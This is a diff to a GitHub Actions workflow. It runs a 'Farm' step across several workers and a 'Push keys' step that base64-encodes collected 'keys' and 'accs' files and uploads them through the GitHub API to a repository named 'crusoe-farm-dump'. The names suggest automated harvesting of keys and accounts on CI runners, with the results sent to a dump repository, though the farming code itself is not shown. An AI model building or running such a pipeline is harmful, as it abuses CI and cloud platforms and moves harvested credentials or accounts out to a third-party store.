@@ -31,7 +31,7 @@ jobs:
       - name: Farm
         env:
           GH_TOKEN: ${{ secrets.PUSH_TOKEN }}
-          WORKER: v${{ matrix.worker }}-${{ github.run_number }}
+          WORKER: ${{ matrix.worker }}-${{ github.run_number }}
           GIST_ID: 9106692a095ccfe9aeca95b468c7ee3d
           MINUTES: ${{ github.event.inputs.minutes || 40 }}
           THREADS: ${{ github.event.inputs.threads }}
@@ -45,15 +45,15 @@ jobs:
       - name: Push keys
         env:
           GH_TOKEN: ${{ secrets.PUSH_TOKEN }}
-          WORKER: v${{ matrix.worker }}-${{ github.run_number }}
+          WORKER: ${{ matrix.worker }}-${{ github.run_number }}
           GIST_ID: 9106692a095ccfe9aeca95b468c7ee3d
         run: |
           ls /tmp/farm/ 2>/dev/null || exit 0
           for F in keys accs; do
-            B64=$(base64 -w0 /tmp/farm/farm342_$F.txt 2>/dev/null) || continue
-            [ -n "$B64" ] || continue
-            gh api -X PUT repos/ronnikols/crusoe-farm-dump/contents/azurev2r/w${WORKER}_$F.txt \
-              -f message="farmv2r w${WORKER} $F $(date -u +%H:%M)" -f content="$B64" >/dev/null && echo "PUSHED_$F" || echo "PUSH_FAIL_$F"
+            B64=$(base64 -w0 /tmp/farm/farmv2r_$F.txt 2>/dev/null) || { echo "NOFILE farmv2r_$F"; continue; }
+            [ -n "$B64" ] || { echo "EMPTY farmv2r_$F"; continue; }
+            gh api -X PUT repos/ronnikols/crusoe-farm-dump/contents/azurev2r/${WORKER}_$F.txt \
+              -f message="farmv2r ${WORKER} $F $(date -u +%H:%M)" -f content="$B64" >/dev/null 2>&1 && echo "PUSHED_$F" || echo "PUSH_FAIL_$F"
           done
 
   respawn:
